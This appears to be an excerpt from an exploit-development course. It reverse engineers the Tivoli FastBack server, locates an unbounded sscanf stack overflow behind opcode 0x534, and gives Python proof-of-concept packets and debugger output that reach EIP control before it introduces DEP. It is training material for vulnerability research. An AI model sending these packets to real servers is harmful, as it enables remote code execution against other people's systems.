Logical vulnerabilities typically come down to implemented functions exposing a security risk, 
such as command injection or the ability to upload an executable file. 
In this module, we will limit our search to memory corruption vulnerabilities. In later modules, we 
will also examine logical vulnerabilities. 
To locate all vulnerabilities exposed by FastBackServer!FXCLI_OraBR_Exec_Command, we would 
need to examine the execution path associated with every opcode. We would typically approach 
 
292 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/memmove/ 
293 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/strcpy/ 
294 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/sscanf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
358 
this methodically by starting at the lowest possible opcode and moving upwards. Reverse 
engineering all execution paths is outside the scope of this module, but as an example, we are 
going to investigate a single function associated with opcode 0x534. 
As a first step, let’s update our PoC to contain three buffers of different size and a valid 
psAgentCommand buffer containing an opcode with a value set to 0x534. We’re choosing to 
investigate the execution path associated with this opcode because it contains a vulnerability that 
we will fully exploit in later modules.  
import socket 
import sys 
from struct import pack 
 
# Checksum 
buf = pack(">i", 0x630) 
# psAgentCommand 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x200)  # 2nd memcpy: size field 
buf += pack("<i", 0x300)  # 3rd memcpy: offset 
buf += pack("<i", 0x300)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
buf += bytearray([0x42]*0x100) # 1st buffer 
buf += bytearray([0x43]*0x200) # 2nd buffer 
buf += bytearray([0x44]*0x300) # 3rd buffer 
... 
Listing 425 - Initial proof of concept for opcode 0x534 
We can trace the updated packet by restarting FastBackServer and placing a breakpoint on the 
first opcode comparison at FXCLI_OraBR_Exec_Command+0x6ac. 
0:003> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac 
 
0:003> g 
Breakpoint 0 hit 
eax=0602c880 ebx=0602a890 ecx=00000534 edx=00000001 esi=0602a890 edi=00669360 
eip=0056cb62 esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac: 
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h 
ss:0023:0dafe368=00000534 
 
0:003> u eip L10 
FastBackServer!FXCLI_OraBR_Exec_Command+0x6ac: 
0056cb62 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h 
0056cb6c 0f8ffa030000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0xab6 
(0056cf6c) 
0056cb72 81bdd0e4f9ff16100000 cmp dword ptr [ebp-61B30h],1016h 
0056cb7c 0f846a650000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x6c36 
(005730ec) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
359 
0056cb82 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h 
0056cb8c 0f8fb4010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x890 
(0056cd46) 
0056cb92 81bdd0e4f9ff54050000 cmp dword ptr [ebp-61B30h],554h 
0056cb9c 0f84c3320000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x39af 
(0056fe65) 
0056cba2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h 
0056cbac 0f8f60010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x85c 
(0056cd12) 
0056cbb2 81bdd0e4f9ff17050000 cmp dword ptr [ebp-61B30h],517h 
0056cbbc 0f84512e0000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x355d 
(0056fa13) 
0056cbc2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h 
0056cbcc 0f8f0c010000    jg      FastBackServer!FXCLI_OraBR_Exec_Command+0x828 
(0056ccde) 
0056cbd2 81bdd0e4f9ff01050000 cmp dword ptr [ebp-61B30h],501h 
0056cbdc 0f8470110000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x189c 
(0056dd52) 
Listing 426 - First comparison against opcode value 
As shown in the listing above, after executing the updated PoC, the breakpoint is hit and we now 
face a list of subsequent comparisons against the supplied opcode. These comparisons are the 
assembly translation from C/C++ code of if and else statements, which are implemented in the 
code to identify the correct function to execute based on the supplied opcode. 
By single-stepping through the instructions shown in Listing 426, we reach the following basic 
block where the program code subtracts 0x518 from the supplied opcode. 
 
Figure 128: Comparison against opcode 
The result of this operation is compared against the 0x3B value. Since 0x1C - the result for our 
opcode - is smaller than 0x3B, the jump at the end of the basic block is not taken and we arrive at 
the switch condition displayed in Figure 129. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
360 
 
Figure 129: Switch statement as implemented in assembly 
The set of instructions in Figure 129 copies the result of the previous arithmetic operation (0x1C) 
into ECX. This register is then used as an index into a byte array starting at address 0x575F6E, to 
fetch a single byte into AL. 
Finally, the value in AL is multiplied by 0x4 and used as an index into the array starting at address 
0x575F06. The retrieved pointer from the array will be the address where execution is transferred 
to, through the jump instruction (0x56CD3F in Figure 129). 
The assembly code in the basic block analyzed above is commonly referred to as 
a jump table or branch table.295 
We can observe this in action using WinDbg: 
eax=0602c880 ebx=0602a890 ecx=00000534 edx=0000001c esi=0602a890 edi=00669360 
eip=0056cd31 esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei ng nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287 
FastBackServer!FXCLI_OraBR_Exec_Command+0x87b: 
0056cd31 8b8dd0e4f9ff    mov     ecx,dword ptr [ebp-61B30h] ss:0023:0dafe368=0000001c 
 
0:003> p 
eax=0602c880 ebx=0602a890 ecx=0000001c edx=0000001c esi=0602a890 edi=00669360 
eip=0056cd37 esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei ng nz na pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287 
FastBackServer!FXCLI_OraBR_Exec_Command+0x881: 
0056cd37 33c0            xor     eax,eax 
 
0:003>  
eax=00000000 ebx=0602a890 ecx=0000001c edx=0000001c esi=0602a890 edi=00669360 
eip=0056cd39 esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x883: 
0056cd39 8a816e5f5700    mov     al,byte ptr 
FastBackServer!FXCLI_OraBR_Exec_Command+0x9ab8 (00575f6e)[ecx] ds:0023:00575f8a=10 
 
295 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Branch_table 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
361 
 
0:003> db 00575f6e+1c L1 
00575f8a  10                                               . 
 
0:003> p 
eax=00000010 ebx=0602a890 ecx=0000001c edx=0000001c esi=0602a890 edi=00669360 
eip=0056cd3f esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x889: 
0056cd3f ff2485065f5700  jmp     dword ptr 
FastBackServer!FXCLI_OraBR_Exec_Command+0x9a50 (00575f06)[eax*4] 
ds:0023:00575f46=00572e27 
 
0:003> dd 00575f06+10*4 L1 
00575f46  00572e27 
 
0:003> p 
eax=00000010 ebx=0602a890 ecx=0000001c edx=0000001c esi=0602a890 edi=00669360 
eip=00572e27 esp=0dafe334 ebp=0db5fe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x6971: 
00572e27 668b85acdafeff  mov     ax,word ptr [ebp-12554h] ss:0023:0db4d944=1a8e 
Listing 427 - Values used in the switch instructions 
As highlighted in Listing 427, our reverse engineering analysis was correct. After the execution of 
the jumptable, we arrive at address 0x572e27 in FXCLI_OraBR_Exec_Command. 
Let’s align IDA Pro with our dynamic analysis at address 0x572e27, and we’ll find the next basic 
block demonstrated below. 
 
Figure 130: Switch branch invoking FXCLI_SetConfFileChunk 
The main task of this basic block is to set up arguments for the call to FXCLI_SetConfFileChunk. If 
we single-step to the call instruction in WinDbg and dump the arguments for the call, we will find 
the psAgentCommand buffer, along with the first and third buffer from the psCommandBuffer, as 
displayed in Listing 428. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
362 
eax=0db4d980 ebx=0602a890 ecx=0db53b30 edx=0602c890 esi=0602a890 edi=00669360 
eip=00572e52 esp=0dafe31c ebp=0db5fe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x699c: 
00572e52 e8b45e0000      call    FastBackServer!FXCLI_SetConfFileChunk (00578d0b) 
 
0:003> dd esp L6 
0dafe31c  0602c890 0db53b30 0db4d980 0db53b2c 
0dafe32c  90b0a8c0 00001a8e 
 
0:003> dd 0602c890  
0602c890  00000000 00000100 00000100 00000200 
0602c8a0  00000300 00000300 41414141 06ff1c08 
0602c8b0  9b7083b6 081d6f84 4c435846 534d5f49 
0602c8c0  00005147 00000000 00000000 00000000 
0602c8d0  00000000 00000000 00000000 00000000 
0602c8e0  00000000 00000000 00000000 00000000 
0602c8f0  00000000 00000000 00000000 00000000 
0602c900  00000000 00000000 00000000 00000000 
 
0:003> dd 0db53b30  
0db53b30  42424242 42424242 42424242 42424242 
0db53b40  42424242 42424242 42424242 42424242 
0db53b50  42424242 42424242 42424242 42424242 
0db53b60  42424242 42424242 42424242 42424242 
0db53b70  42424242 42424242 42424242 42424242 
0db53b80  42424242 42424242 42424242 42424242 
0db53b90  42424242 42424242 42424242 42424242 
0db53ba0  42424242 42424242 42424242 42424242 
 
0:003> dd 0db4d980  
0db4d980  44444444 44444444 44444444 44444444 
0db4d990  44444444 44444444 44444444 44444444 
0db4d9a0  44444444 44444444 44444444 44444444 
0db4d9b0  44444444 44444444 44444444 44444444 
0db4d9c0  44444444 44444444 44444444 44444444 
0db4d9d0  44444444 44444444 44444444 44444444 
0db4d9e0  44444444 44444444 44444444 44444444 
0db4d9f0  44444444 44444444 44444444 44444444 
Listing 428 - Arguments for FXCLI_SetConfFileChunk 
With wide control over the content of the arguments, it is definitely worth investigating the target 
function. 
Examining the FXCLI_SetConfFileChunk function, we find a call to sscanf296 (Figure 131). This 
function is interesting because, depending on its input arguments, it can produce a memory 
corruption vulnerability. Let’s investigate how this works. 
 
296 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/sscanf/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
363 
 
Figure 131: Basic block with sscanf call 
The following listing shows sscanf function prototype:297 
int sscanf(const char *buffer, const char *format, ... ); 
Listing 429 - Function prototype for sscanf 
The first argument (*buffer) is the source buffer. The second argument (*format) is a format 
string specifier,298 which decides how the source buffer is interpreted. Depending on the format 
string specifier, the source buffer is split and copied into the optional argument buffers given as 
“…” in Listing 429. 
We can understand this better by performing dynamic analysis. We’ll single step up to the call and 
dump the arguments from the stack: 
eax=0dafe310 ebx=0602a890 ecx=0dafe204 edx=0db53b30 esi=0602a890 edi=00669360 
eip=00578d4b esp=0dafdbc0 ebp=0dafe314 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!FXCLI_SetConfFileChunk+0x40: 
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525) 
 
0:003> dd esp L7 
0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310 
0dafdbd0  0dafdffc 0dafe308 0dafe30c 
 
0:003> dd 0db53b30 
0db53b30  42424242 42424242 42424242 42424242 
0db53b40  42424242 42424242 42424242 42424242 
0db53b50  42424242 42424242 42424242 42424242 
0db53b60  42424242 42424242 42424242 42424242 
0db53b70  42424242 42424242 42424242 42424242 
0db53b80  42424242 42424242 42424242 42424242 
0db53b90  42424242 42424242 42424242 42424242 
0db53ba0  42424242 42424242 42424242 42424242 
 
0:003> da 0085b0dc 
 
297 (TutorialsPoint, 2020), https://www.tutorialspoint.com/c_standard_library/c_function_sscanf.htm 
298 (GeeksforGeeks, 2020), https://www.geeksforgeeks.org/format-specifiers-in-c/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
364 
0085b0dc  "File: %s From: %d To: %d ChunkLo" 
0085b0fc  "c: %d FileLoc: %d" 
Listing 430 - Arguments for sscanf 
The output in Listing 430 shows that the source buffer is the first psCommandBuffer and the 
format string specifier is the highlighted ASCII string. 
We can identify how the format string specifier is interpreted by going through each “%” sign in 
the ASCII string. First, %s means that the source buffer must contain a null-terminated string. This 
string will be copied into the address supplied in the third argument. 
Next, the %d specifier means that we read a decimal integer after the null-terminated string and 
copy it into the address supplied by the fourth argument, and so forth. 
If a vulnerability is present, we’ll find it in the copy of the null-terminated string because no size 
parameter is supplied in the call to sscanf and no validation is performed on the input. There is 
also no way of knowing beforehand how large the destination buffer supplied by the third 
argument must be. 
We can supply a network packet up to 0x4400 bytes in size, consisting of a psCommandBuffer up 
to 0x43CC bytes. If the destination buffer is smaller than this, we can overflow it and write beyond 
it. Additionally, if the destination buffer is on the stack at a lower address than a return address, 
we can leverage it to gain control of EIP. 
From Listing 431, we observe that the destination buffer is within the upper and lower bounds of 
the stack: 
0:003> dd esp L7 
0dafdbc0  0db53b30 0085b0dc 0dafe204 0dafe310 
0dafdbd0  0dafdffc 0dafe308 0dafe30c 
 
0:003> !teb 
TEB at 0035d000 
    ExceptionList:        0db5ff38 
    StackBase:            0db60000 
    StackLimit:           0dafd000 
    SubSystemTib:         00000000 
... 
Listing 431 - Destination buffer is on the stack 
Next, we need to find the distance from the destination buffer to a return address and determine 
if it is less than 0x43CC bytes: 
0:003> k 
 # ChildEBP RetAddr   
00 0dafe314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40 
01 0db5fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1 
02 0db5feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
03 0db5fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
04 0db5ff48 006693e9 FastBackServer!ORABR_Thread+0xef 
05 0db5ff80 76449564 FastBackServer!_beginthreadex+0xf4 
06 0db5ff94 772d293c KERNEL32!BaseThreadInitThunk+0x24 
07 0db5ffdc 772d2910 ntdll!__RtlUserThreadStart+0x2b 
08 0db5ffec 00000000 ntdll!_RtlUserThreadStart+0x1b 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
365 
 
0:003> dds 0dafe314 L2 
0dafe314  0db5fe98 
0dafe318  00572e57 FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1 
 
0:003> ? 0dafe318 - 0dafe204  
Evaluate expression: 276 = 00000114 
Listing 432 - Call stack and distance to return address 
In this instance, the distance from the destination buffer to the first return address is only 0x114 
bytes. We can easily craft a packet that will overflow its limits. 
The source buffer must be crafted according to the sscanf format string, which the API uses to 
parse each value. The first portion of the psCommandBuffer buffer must contain a very large 
ASCII string after the “File:” marker. 
Let’s draft a simple PoC using a length of 0x200. We can ignore the second and third 
psCommandBuffers, as shown in Listing 433.  
import socket 
import sys 
from struct import pack 
 
# psAgentCommand 
buf = bytearray([0x41]*0xC) 
buf += pack("<i", 0x534)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x200)  # 1st memcpy: size field 
buf += pack("<i", 0x0)    # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x0)    # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % 
(b"A"*0x200,0,0,0,0) 
buf += formatString 
 
# Checksum 
buf = pack(">i", len(buf)-4) + buf 
... 
Listing 433 - Proof of concept to trigger the sscanf call 
The format string buffer is created through the % Python format string operator.299 Lastly, the 
checksum value must match the length of the packet, so it is dynamically calculated at the end of 
Listing 433. 
Let’s test this. We’ll remove the existing breakpoints, set a new one on the call to sscanf, and then 
execute our PoC: 
 
299 (Joanna Jablonski, 2019), https://realpython.com/python-f-strings/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
366 
0:068> bc 
 
0:068> bp FastBackServer!FXCLI_SetConfFileChunk+0x40 
 
0:068> g 
Breakpoint 0 hit 
eax=0d79e310 ebx=060cc190 ecx=0d79e204 edx=0d7f3b30 esi=060cc190 edi=00669360 
eip=00578d4b esp=0d79dbc0 ebp=0d79e314 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!FXCLI_SetConfFileChunk+0x40: 
00578d4b e8d5e70e00      call    FastBackServer!sscanf (00667525) 
 
0:001> dd esp L7 
0d79dbc0  0d7f3b30 0085b0dc 0d79e204 0d79e310 
0d79dbd0  0d79dffc 0d79e308 0d79e30c 
 
0:001> da 0d7f3b30  
0d7f3b30  "File: AAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3c30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3c50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3c70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
0d7f3c90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
Listing 434 - Crafted arguments set up for sscanf call 
The line highlighted in Listing 434 shows the format string correctly set up with a very long ASCII 
string following the “File:” marker. 
Let’s analyze the call stack before and after the call to sscanf to check if we can successfully 
overwrite the return address on the stack: 
0:001> k L4 
 # ChildEBP RetAddr   
00 0d79e314 00572e57 FastBackServer!FXCLI_SetConfFileChunk+0x40 
01 0d7ffe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x69a1 
02 0d7ffeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130 
03 0d7ffef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116 
 
0:001> p 
eax=00000001 ebx=060cc190 ecx=0d79db98 edx=0d79db98 esi=060cc190 edi=00669360 
eip=00578d50 esp=0d79dbc0 ebp=0d79e314 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_SetConfFileChunk+0x45: 
00578d50 83c41c          add     esp,1Ch 
 
0:001> k 
 # ChildEBP RetAddr   
00 0d79e314 41414141 FastBackServer!FXCLI_SetConfFileChunk+0x45 
WARNING: Frame IP not in any known module. Following frames may be wrong. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
367 
01 0d79e318 41414141 0x41414141 
02 0d79e31c 41414141 0x41414141 
03 0d79e320 41414141 0x41414141 
04 0d79e324 41414141 0x41414141 
05 0d79e328 41414141 0x41414141 
06 0d79e32c 41414141 0x41414141 
... 
Listing 435 - Executing sscanf and triggering vulnerability 
Excellent! The return address has been overwritten. 
Finally, we can let execution continue and exit the current function to gain control of EIP: 
0:001> g 
(1ab0.1320): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=00000000 ebx=060cc190 ecx=0d79ca70 edx=77301670 esi=060cc190 edi=00669360 
eip=41414141 esp=0d79e31c ebp=41414141 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
41414141 ??              ??? 
Listing 436 - Obtaining control of EIP 
This proves the presence of a vulnerability with a high probability of exploitability. 
In this section, we reverse engineered opcode 0x534 and found a bug that will likely lead to 
remote code execution. Since this is only one of many possible opcodes, several other 
vulnerabilities may exist in this application. 
In the following modules, we will revisit the Tivoli application and learn how to exploit these 
vulnerabilities to obtain remote code execution despite the presence of various security 
mitigations. 
8.4.2.1 Exercises 
1. 
Update the PoC to follow the execution path related to opcode 0x534 and trace the initial 
comparisons in WinDbg and IDA Pro. 
2. 
Inside the function FXCLI_SetConfFileChunk, examine and understand the arguments for the 
sscanf call. 
3. 
Update the PoC to overflow the destination buffer and overwrite the return address on the 
stack. 
4. 
Obtain control of EIP. 
8.4.2.2 Extra Mile 
Modify the PoC to use a different opcode and locate another vulnerability in the FastBackServer 
application. 
8.4.2.3 Extra Mile 
Note: This exercise is not for the faint of heart. You will have to Try Harder! 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
368 
Install an evaluation edition of Faronics Deep Freeze Enterprise Server from C:\Installers\Faronics. 
Anything can be entered as the customization code. 
Once the application is installed, use TCPView to locate listening ports for the 
DFServerService.exe application. Combine dynamic analysis using WinDbg and static analysis 
with IDA Pro to reverse engineer the network protocol and locate some of the multiple 
vulnerabilities in this application, including denial of service, memory corruption, and logical bugs. 
There are more than 15 vulnerabilities to find! 
Create a PoC script to trigger at least one of the memory corruption vulnerabilities. 
Note: The DFServerService.exe executable is packed with a UPX packer.300 IDA Pro is not able to 
parse it. 
Since this concept is not covered in this course, you can either use the PE.Explorer_setup.exe 
installer present in C:\Installers\UPX to install unpacking software, or use the already unpacked 
executable DFServerServiceUnpacked.exe also located in the C:\Installers\UPX folder. 
8.5 Wrapping Up 
In this module, we practiced the entire reverse engineering process: from application installation 
and enumeration, to protocol reverse engineering, all the way through identifying vulnerabilities. 
We reached our goal of understanding how to combine static and dynamic analysis to 
understand a program’s behavior and find vulnerabilities. This technique helps us reverse 
engineer server applications that do not use dynamic scripting languages. 
In the following modules, we will take advantage of the vulnerabilities found in FastBackServer to 
develop exploits that bypass various modern security mitigations in Windows. 
 
300 (The UPX Team, 2020), https://upx.github.io/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
369 
 
9 Stack Overflows and DEP Bypass 
In previous modules, we developed various exploits and only had to worry about SafeSEH. With 
the arrival of Windows XP SP2, Microsoft adopted another security feature called Data Execution 
Prevention (DEP).301 This was the beginning of a vast array of mitigations. 
In this module, we will dig into DEP and learn how to bypass it. This is an essential part of exploit 
development for most new binary vulnerabilities. We will reuse the vulnerabilities discussed in the 
previous module and continue to use the Tivoli FastBack backup software as our case study. 
First, we must understand what DEP is and how it works in Windows. Then we will return to our 
case study and craft an exploit to bypass DEP and obtain remote code execution. 
Tivoli FastBack does not make use of DEP natively, so we will manually enable it in this module. 
9.1 Data Execution Prevention 
To exploit a traditional stack overflow vulnerability, we would place our shellcode in the buffer that 
overwrites the stack. Then, we would locate and use an assembly instruction like “JMP ESP”, 
which effectively transfers execution to the stack. 
DEP was created to mitigate this type of exploit technique. It was invented with hardware support 
from Intel CPUs and eventually implemented in the Windows operating system in 2003. In the 
next section, we will delve into the specifics of the mitigation and learn how a typical exploit will 
fail with this protection in place. 
9.1.1 DEP Theory 
Microsoft introduced DEP in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 
1 as a new security feature to prevent code execution from a non-executable memory region. 
On compatible CPUs, DEP sets the non-executable (NX) bit that distinguishes between code and 
data areas in memory. An operating system supporting the NX bit can mark certain areas of 
memory non-executable, meaning the CPU won’t execute any code residing there. This technique 
can be used to prevent malware from injecting code into another program’s data storage area 
and then running that code. 
At a global level, the operating system can be configured through the /NoExecute option in 
boot.ini (Windows XP) or through bcdedit.exe, (from Windows Vista and above) to run in one of 
four modes. 
• 
OptIn: DEP is enabled for system processes and custom-defined applications only. 
• 
OptOut: DEP is enabled for everything except specifically exempt applications. 
• 
AlwaysOn: DEP is permanently enabled. 
• 
AlwaysOff: DEP is permanently disabled. 
 
301 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
370 
It’s interesting to note that, in some cases, DEP can be enabled or disabled on a per-process basis 
at execution time. The routine that implements this feature, LdrpCheckNXCompatibility, resides in 
ntdll.dll and performs various checks to determine whether or not NX support should be enabled 
for the process. 
As a result of these checks, a call to NtSetInformationProcess (within ntdll.dll) is issued to enable 
or disable DEP for the running process. This feature was introduced by Microsoft to minimize 
application compatibility issues. 
It is worth noting that Windows client operating systems like Windows 7 and 
Windows 10, have OptIn as the default setting. Windows server editions like 
Windows Server 2012 or Windows Server 2019 have AlwaysOn as the default 
setting. 
To watch DEP in action, we are going to open Notepad and attach WinDbg to it . We can then use 
the WinDbg !vprot302 command to display the memory protections of a given address. 
First, we will dump the memory protections associated with the address in EIP, which will be 
inside the code section of ntdll.dll. 
0:006> !vprot eip 
BaseAddress:       77901000 
AllocationBase:    77870000 
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY 
RegionSize:        00087000 
State:             00001000  MEM_COMMIT 
Protect:           00000020  PAGE_EXECUTE_READ 
Type:              01000000  MEM_IMAGE 
Listing 437 - Dumping memory protections for a code page 
This memory page has a protection setting called PAGE_EXECUTE_READ, which means that it is 
both executable and readable. 
We can issue the same command on the address in ESP: 
0:006> !vprot esp 
BaseAddress:       0101f000 
AllocationBase:    00fe0000 
AllocationProtect: 00000004  PAGE_READWRITE 
RegionSize:        00001000 
State:             00001000  MEM_COMMIT 
Protect:           00000004  PAGE_READWRITE 
Type:              00020000  MEM_PRIVATE 
Listing 438 - Dumping memory protections for a stack page 
Here we find that the memory address is only writable and readable. 
 
302 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vprot 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
371 
These memory protections must be enforced by the CPU through DEP to have any effect. To 
check if DEP is enabled, we can use the Narly303 WinDbg extension and run the !nmod command 
to dump enabled mitigations. 
0:006> .load narly 
 
0:006> !nmod 
01030000 0106f000 notepad  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\notepad.exe 
... 
Listing 439 - Dumping security features for Notepad 
Narly detects the security features by parsing the PE header. In listing 439, the SafeSEH, ASLR, 
and DEP memory protections are enabled. We won’t worry about ASLR protection in this module, 
but we will verify DEP by simulating an exploit. 
We will do this by writing a dummy shellcode of four NOPs on the stack and then copying the 
current stack address into EIP and single step over the first NOP: 
0:006> ed esp 90909090 
 
0:006> r eip = esp 
 
0:006> r 
eax=002d6000 ebx=00000000 ecx=77939bc0 edx=01008802 esi=77939bc0 edi=77939bc0 
eip=0101f7c8 esp=0101f7c8 ebp=0101f7f4 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0101f7c8 90              nop 
 
0:006> p 
(1d60.120c): Access violation - code c0000005 (first chance) 
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled. 
eax=002d6000 ebx=00000000 ecx=77939bc0 edx=01008802 esi=77939bc0 edi=77939bc0 
eip=0101f7c8 esp=0101f7c8 ebp=0101f7f4 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 
0101f7c8 90              nop 
Listing 440 - Access violation when executing dummy shellcode 
The execution is blocked and the operating system throws an access violation. In this case, DEP 
blocks our basic stack buffer overflow simulation. 
Before we start working on bypassing DEP, we will cover a feature in Windows 10 called Windows 
Defender Exploit Guard, which will allow us to enforce DEP for the Tivoli FastBack server. 
